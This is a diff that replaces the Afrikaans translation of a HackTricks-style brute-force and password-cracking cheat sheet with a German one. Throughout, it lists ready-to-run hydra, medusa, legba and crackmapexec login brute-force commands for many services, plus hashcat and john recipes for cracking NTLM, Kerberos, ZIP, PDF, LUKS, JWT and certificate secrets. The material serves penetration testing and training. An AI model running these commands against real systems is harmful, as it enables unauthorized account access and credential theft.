@@ -3,29 +3,29 @@
 <figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Gebruik [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=brute-force) om maklik te bou en **outomatiese werksvloei** te skep wat aangedryf word deur die wêreld se **mees gevorderde** gemeenskapstoestelle.\
-Kry Toegang Vandag:
+Verwenden Sie [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=brute-force), um einfach **Workflows** zu erstellen und zu **automatisieren**, die von den **fortschrittlichsten** Community-Tools der Welt unterstützt werden.\
+Zugang heute erhalten:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=brute-force" %}
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Support HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.
 
 </details>
 {% endhint %}
 
-## Default Credentials
+## Standardanmeldeinformationen
 
-**Soek in google** vir standaard geloofsbriewe van die tegnologie wat gebruik word, of **probeer hierdie skakels**:
+**Suchen Sie bei Google** nach Standardanmeldeinformationen der verwendeten Technologie oder **versuchen Sie diese Links**:
 
 * [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
 * [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
@@ -40,9 +40,9 @@ Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size=
 * [**https://many-passwords.github.io/**](https://many-passwords.github.io)
 * [**https://theinfocentric.com/**](https://theinfocentric.com/)
 
-## **Skep jou eie Woordeboeke**
+## **Erstellen Sie Ihre eigenen Wörterbücher**
 
-Vind soveel inligting oor die teiken as wat jy kan en genereer 'n pasgemaakte woordeboek. Gereedskap wat kan help:
+Sammeln Sie so viele Informationen über das Ziel, wie Sie können, und generieren Sie ein benutzerdefiniertes Wörterbuch. Tools, die helfen können:
 
 ### Crunch
 ```bash
@@ -61,13 +61,13 @@ cewl example.com -m 5 -w words.txt
 ```
 ### [CUPP](https://github.com/Mebus/cupp)
 
-Genereer wagwoorde gebaseer op jou kennis van die slagoffer (name, datums...)
+Generiere Passwörter basierend auf deinem Wissen über das Opfer (Namen, Daten...)
 ```
 python3 cupp.py -h
 ```
 ### [Wister](https://github.com/cycurity/wister)
 
-'n Woordlys generator hulpmiddel, wat jou toelaat om 'n stel woorde te verskaf, wat jou die moontlikheid gee om verskeie variasies van die gegewe woorde te skep, wat 'n unieke en ideale woordlys skep om te gebruik met betrekking tot 'n spesifieke teiken.
+Ein Tool zur Generierung von Wortlisten, das es Ihnen ermöglicht, eine Menge von Wörtern bereitzustellen, wodurch Sie die Möglichkeit haben, mehrere Variationen aus den gegebenen Wörtern zu erstellen und eine einzigartige und ideale Wortliste für ein bestimmtes Ziel zu erstellen.
 ```bash
 python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst
 
@@ -88,7 +88,7 @@ Finished in 0.920s.
 ```
 ### [pydictor](https://github.com/LandGrey/pydictor)
 
-### Woordlyste
+### Wortlisten
 
 * [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
 * [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
@@ -104,14 +104,14 @@ Finished in 0.920s.
 <figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Gebruik [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=brute-force) om maklik te bou en **werkvloei** te **automate** wat aangedryf word deur die wêreld se **meest gevorderde** gemeenskapstools.\
-Kry Toegang Vandag:
+Verwenden Sie [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=brute-force), um einfach **Workflows** zu erstellen und zu **automatisieren**, die von den **fortschrittlichsten** Community-Tools der Welt unterstützt werden.\
+Zugang heute erhalten:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=brute-force" %}
 
 ## Dienste
 
-Georden alfabeties volgens diensnaam.
+Alphabetisch nach Dienstnamen geordnet.
 
 ### AFP
 ```bash
@@ -127,7 +127,7 @@ msf> run
 ```bash
 nmap --script ajp-brute -p 8009 <IP>
 ```
-## AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM en Solace)
+## AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM und Solace)
 ```bash
 legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
 ```
@@ -142,7 +142,7 @@ legba scylla --username cassandra --password wordlists/passwords.txt --target lo
 msf> use auxiliary/scanner/couchdb/couchdb_login
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
 ```
-### Docker Registrasie
+### Docker-Registry
 ```
 hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
 ```
@@ -157,11 +157,11 @@ ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
 medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
 legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
 ```
-### HTTP Generiese Brute
+### HTTP Generic Brute
 
 #### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)
 
-### HTTP Basiese Auth
+### HTTP Basic Auth
 ```bash
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
 # Use https-get mode for https
@@ -173,14 +173,14 @@ legba http.basic --username admin --password wordlists/passwords.txt --target ht
 legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
 legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
 ```
-### HTTP - Post Form
+### HTTP - Post-Form
 ```bash
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
 # Use https-post-form mode for https
 ```
-Vir http**s** moet jy verander van "http-post-form" na "**https-post-form"**
+Für http**s** müssen Sie von "http-post-form" zu "**https-post-form" wechseln.
 
-### **HTTP - CMS --** (W)ordpress, (J)oomla of (D)rupal of (M)oodle
+### **HTTP - CMS --** (W)ordpress, (J)oomla oder (D)rupal oder (M)oodle
 ```bash
 cmsmap -f W/J/D/M -u a -p a https://wordpress.com
 # Check also https://github.com/evilsocket/legba/wiki/HTTP
@@ -300,11 +300,11 @@ nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>
 
 legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
 ```
-Om **oracle\_login** met **patator** te gebruik, moet jy **installeer**:
+Um **oracle\_login** mit **patator** zu verwenden, müssen Sie **installieren**:
 ```bash
 pip3 install cx_Oracle --upgrade
 ```
-[Offline OracleSQL hash bruteforce](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**weergawe 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** en **11.2.0.3**):
+[Offline OracleSQL hash bruteforce](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**Versionen 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** und **11.2.0.3**):
 ```bash
 nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
 ```
@@ -331,7 +331,7 @@ legba pgsql --username admin --password wordlists/passwords.txt --target localho
 ```
 ### PPTP
 
-Jy kan die `.deb` pakket aflaai om te installeer vanaf [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)
+Sie können das `.deb`-Paket zum Installieren von [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/) herunterladen.
 ```bash
 sudo dpkg -i thc-pptp-bruter*.deb #Install the package
 cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
@@ -422,13 +422,13 @@ legba ssh --username admin --password wordlists/passwords.txt --target localhost
 # Try keys from a folder
 legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
 ```
-#### Swak SSH sleutels / Debian voorspelbare PRNG
+#### Schwache SSH-Schlüssel / Vorhersehbarer PRNG in Debian
 
-Sommige stelsels het bekende gebreke in die willekeurige saad wat gebruik word om kriptografiese materiaal te genereer. Dit kan lei tot 'n dramaties verminderde sleutelruimte wat met gereedskap soos [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute) gebruteforce kan word. Voor-gegenererde stelle van swak sleutels is ook beskikbaar soos [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
+Einige Systeme haben bekannte Schwächen im Zufallsseed, der zur Generierung kryptografischer Materialien verwendet wird. Dies kann zu einem dramatisch reduzierten Schlüsselraum führen, der mit Tools wie [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute) bruteforced werden kann. Vorgefertigte Sets schwacher Schlüssel sind ebenfalls verfügbar, wie [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
 
-### STOMP (ActiveMQ, RabbitMQ, HornetQ en OpenMQ)
+### STOMP (ActiveMQ, RabbitMQ, HornetQ und OpenMQ)
 
-Die STOMP teksprotokol is 'n wyd gebruikte boodskapprotokol wat **naatlose kommunikasie en interaksie met gewilde boodskapkwotasiedienste** soos RabbitMQ, ActiveMQ, HornetQ, en OpenMQ toelaat. Dit bied 'n gestandaardiseerde en doeltreffende benadering om boodskappe uit te ruil en verskeie boodskapoperasies uit te voer.
+Das STOMP-Textprotokoll ist ein weit verbreitetes Messaging-Protokoll, das **nahtlose Kommunikation und Interaktion mit beliebten Message-Queue-Diensten** wie RabbitMQ, ActiveMQ, HornetQ und OpenMQ ermöglicht. Es bietet einen standardisierten und effizienten Ansatz zum Austausch von Nachrichten und zur Durchführung verschiedener Messaging-Operationen.
 ```bash
 legba stomp --target localhost:61613 --username admin --password data/passwords.txt
 ```
@@ -469,28 +469,28 @@ crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 <figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Gebruik [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=brute-force) om maklik **werkvloei** te bou en te **automate** wat deur die wêreld se **mees gevorderde** gemeenskapstools aangedryf word.\
-Kry Toegang Vandag:
+Verwenden Sie [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=brute-force), um einfach **Workflows** zu erstellen und zu **automatisieren**, die von den **fortschrittlichsten** Community-Tools der Welt unterstützt werden.\
+Zugang heute erhalten:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=brute-force" %}
 
-## Plaaslik
+## Lokal
 
-### Aanlyn krakdatabasisse
+### Online-Cracking-Datenbanken
 
 * [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
-* [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 met/sonder ESS/SSP en met enige uitdaging se waarde)
-* [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, WPA2 vangste, en argiewe MSOffice, ZIP, PDF...)
+* [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 mit/ohne ESS/SSP und mit jedem Wert der Herausforderung)
+* [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, WPA2-Captures und Archive MSOffice, ZIP, PDF...)
 * [https://crackstation.net/](https://crackstation.net) (Hashes)
 * [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
-* [https://gpuhash.me/](https://gpuhash.me) (Hashes en lêer hashes)
+* [https://gpuhash.me/](https://gpuhash.me) (Hashes und Datei-Hashes)
 * [https://hashes.org/search.php](https://hashes.org/search.php) (Hashes)
 * [https://www.cmd5.org/](https://www.cmd5.org) (Hashes)
 * [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
 * [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
 * [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)
 
-Kyk hierna voordat jy probeer om 'n Hash te brute force.
+Überprüfen Sie dies, bevor Sie versuchen, einen Hash mit Brute Force zu knacken.
 
 ### ZIP
 ```bash
@@ -508,10 +508,10 @@ john zip.john
 hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
 .\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
 ```
-#### Bekende platte teks zip aanval
+#### Bekannter Klartext-Zip-Angriff
 
-Jy moet die **platte teks** (of 'n deel van die platte teks) **van 'n lêer wat binne** die versleutelde zip bevat, weet. Jy kan **lêername en grootte van lêers wat binne** 'n versleutelde zip is, nagaan deur: **`7z l encrypted.zip`**\
-Laai [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) van die vrylating bladsy af.
+Sie müssen den **Klartext** (oder einen Teil des Klartexts) **einer Datei, die sich innerhalb** der verschlüsselten Zip-Datei befindet, kennen. Sie können **Dateinamen und die Größe der in** einer verschlüsselten Zip-Datei enthaltenen Dateien überprüfen, indem Sie ausführen: **`7z l encrypted.zip`**\
+Laden Sie [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) von der Veröffentlichungsseite herunter.
 ```bash
 # You need to create a zip file containing only the file that is inside the encrypted zip
 zip plaintext.zip plaintext.file
@@ -543,9 +543,9 @@ pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
 sudo apt-get install qpdf
 qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
 ```
-### PDF Eienaar Wagwoord
+### PDF-Besitzerpasswort
 
-Om 'n PDF Eienaar wagwoord te kraak, kyk hier: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
+Um ein PDF-Besitzerpasswort zu knacken, überprüfen Sie dies: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
 
 ### JWT
 ```bash
@@ -559,7 +559,7 @@ python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5h
 python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
 john jwt.john #It does not work with Kali-John
 ```
-### NTLM kraking
+### NTLM-Cracking
 ```bash
 Format:USUARIO:ID:HASH_LM:HASH_NT:::
 john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
@@ -579,18 +579,18 @@ john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
 hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 ./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
 ```
-### Lucks beeld
+### Luks-Bild
 
-#### Metode 1
+#### Methode 1
 
-Installeer: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
+Installieren: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
 ```bash
 bruteforce-luks -f ./list.txt ./backup.img
 cryptsetup luksOpen backup.img mylucksopen
 ls /dev/mapper/ #You should find here the image mylucksopen
 mount /dev/mapper/mylucksopen /mnt
 ```
-#### Metode 2
+#### Methode 2
 ```bash
 cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
 dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
@@ -599,7 +599,7 @@ cryptsetup luksOpen backup.img mylucksopen
 ls /dev/mapper/ #You should find here the image mylucksopen
 mount /dev/mapper/mylucksopen /mnt
 ```
-Nog 'n Luks BF tutoriaal: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)
+Ein weiterer Luks BF-Tutorial: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)
 
 ### Mysql
 ```bash
@@ -607,7 +607,7 @@ Nog 'n Luks BF tutoriaal: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-
 <USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
 dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
 ```
-### PGP/GPG Privaat sleutel
+### PGP/GPG Privatkey
 ```bash
 gpg2john private_pgp.key #This will generate the hash and save it in a file
 john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
@@ -616,16 +616,16 @@ john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
 
 <figure><img src="../.gitbook/assets/image (663).png" alt=""><figcaption></figcaption></figure>
 
-### DPAPI Meester Sleutel
+### DPAPI Master Key
 
-Gebruik [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) en dan john
+Verwenden Sie [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) und dann john
 
-### Open Office Wachtwoord Beskermde Kolom
+### Open Office Pwd Geschützte Spalte
 
-As jy 'n xlsx-lêer het met 'n kolom wat deur 'n wagwoord beskerm word, kan jy dit ontprotect:
+Wenn Sie eine xlsx-Datei mit einer durch ein Passwort geschützten Spalte haben, können Sie sie entsperren:
 
-* **Laai dit op na google drive** en die wagwoord sal outomaties verwyder word
-* Om dit **handmatig** te **verwyder**:
+* **Laden Sie es in Google Drive hoch** und das Passwort wird automatisch entfernt
+* Um es **manuell** **zu entfernen**:
 ```bash
 unzip file.xlsx
 grep -R "sheetProtection" ./*
@@ -634,7 +634,7 @@ hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UV
 # Remove that line and rezip the file
 zip -r file.xls .
 ```
-### PFX Sertifikate
+### PFX-Zertifikate
 ```bash
 # From https://github.com/Ridter/p12tool
 ./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
@@ -644,16 +644,16 @@ crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
 <figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Gebruik [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=brute-force) om maklik **werkvloei** te bou en te **automate** wat deur die wêreld se **meest gevorderde** gemeenskapstools aangedryf word.\
-Kry Toegang Vandag:
+Verwenden Sie [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=brute-force), um einfach **Workflows** zu erstellen und zu **automatisieren**, die von den **fortschrittlichsten** Community-Tools der Welt unterstützt werden.\
+Zugang heute erhalten:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=brute-force" %}
 
-## Gereedskap
+## Tools
 
-**Hash voorbeelde:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)
+**Hash-Beispiele:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)
 
-### Hash-identifiseerder
+### Hash-identifier
 ```bash
 hash-identifier
 > <HASH>
@@ -665,33 +665,33 @@ hash-identifier
 * [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
 * [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)
 
-### **Wordlist Generation Tools**
+### **Wordlist-Generierungstools**
 
-* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Gevorderde sleutelbord-wandelgenerator met konfigureerbare basis karakters, sleutelkaart en roetes.
+* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Fortgeschrittener Keyboard-Walk-Generator mit konfigurierbaren Basiszeichen, Tastaturbelegung und Routen.
 ```bash
 kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
 ```
-### John mutasie
+### John Mutation
 
-Lees _**/etc/john/john.conf**_ en konfigureer dit
+Lese _**/etc/john/john.conf**_ und konfiguriere es
 ```bash
 john --wordlist=words.txt --rules --stdout > w_mutated.txt
 john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
 ```
 ### Hashcat
 
-#### Hashcat-aanvalle
+#### Hashcat-Angriffe
 
-* **Woordlys-aanval** (`-a 0`) met reëls
+* **Wörterbuchangriff** (`-a 0`) mit Regeln
 
-**Hashcat** kom reeds met 'n **map wat reëls bevat** maar jy kan [**ander interessante reëls hier vind**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
+**Hashcat** kommt bereits mit einem **Ordner, der Regeln enthält**, aber Sie können [**andere interessante Regeln hier finden**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
 ```
 hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
 ```
-* **Wordlist combinator** aanval
+* **Wordlist combinator** Angriff
 
-Dit is moontlik om **2 woordlyste in 1** te kombineer met hashcat.\
-As lys 1 die woord **"hello"** bevat en die tweede 2 lyne met die woorde **"world"** en **"earth"** bevat. Die woorde `helloworld` en `helloearth` sal gegenereer word.
+Es ist möglich, **2 Wortlisten zu 1 zu kombinieren** mit hashcat.\
+Wenn Liste 1 das Wort **"hello"** enthielt und die zweite 2 Zeilen mit den Wörtern **"world"** und **"earth"** enthielt. Die Wörter `helloworld` und `helloearth` werden generiert.
 ```bash
 # This will combine 2 wordlists
 hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt
@@ -702,7 +702,7 @@ hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt
 ## hello-earth!
 hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
 ```
-* **Mask aanval** (`-a 3`)
+* **Maskenangriff** (`-a 3`)
 ```bash
 # Mask attack with simple mask
 hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d
@@ -734,7 +734,7 @@ hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
 ## Use it to crack the password
 hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
 ```
-* Woordlys + Masker (`-a 6`) / Masker + Woordlys (`-a 7`) aanval
+* Wortliste + Maske (`-a 6`) / Maske + Wortliste (`-a 7`) Angriff
 ```bash
 # Mask numbers will be appended to each word in the wordlist
 hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d
@@ -742,23 +742,23 @@ hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d
 # Mask numbers will be prepended to each word in the wordlist
 hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
 ```
-#### Hashcat modi
+#### Hashcat-Modi
 ```bash
 hashcat --example-hashes | grep -B1 -A2 "NTLM"
 ```
-Kraak van Linux Hashes - /etc/shadow lêer
+Cracking Linux Hashes - /etc/shadow Datei
 ```
 500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
 3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
 7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
 1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
 ```
-Kraak Windows Hasse
+Cracking von Windows-Hashes
 ```
 3000 | LM                                               | Operating-Systems
 1000 | NTLM                                             | Operating-Systems
 ```
-Kraak Algemene Toepassing Hashes
+Knacken gängiger Anwendungs-Hashes
 ```
 900 | MD4                                              | Raw Hash
 0 | MD5                                              | Raw Hash
@@ -769,16 +769,16 @@ Kraak Algemene Toepassing Hashes
 1700 | SHA-512                                          | Raw Hash
 ```
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lerne & übe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>Unterstütze HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
